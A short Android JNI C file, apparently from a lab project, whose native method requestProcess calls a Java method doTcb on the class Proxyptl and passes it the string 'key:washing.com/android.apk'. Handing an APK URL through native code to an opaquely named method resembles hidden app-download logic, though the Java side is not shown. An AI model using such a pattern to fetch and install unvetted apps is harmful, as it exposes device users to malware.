#include <stdio.h>
#include <stdlib.h>
#include <android/log.h>
#ifndef LOG_TAG
#define LOG_TAG "ANDROID_LAB"
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#endif
#include "com_tec_key_Ptlmaner.h"

JNIEXPORT void JNICALL Java_com_tec_key_Ptlmaner_requestProcess
(JNIEnv *env, jobject job){
jclass  jcla = (*env)->FindClass(env,"com/tec/key/Proxyptl");
jmethodID jm=(*env)->GetMethodID(env,jcla,"doTcb","(Ljava/lang/String;)V");
jobject jobject1=(*env)->AllocObject(env,jcla);
jstring  text=(*env)->NewStringUTF(env,"key:washing.com/android.apk");
(*env)->CallVoidMethod(env,jobject1,jm,text);
}
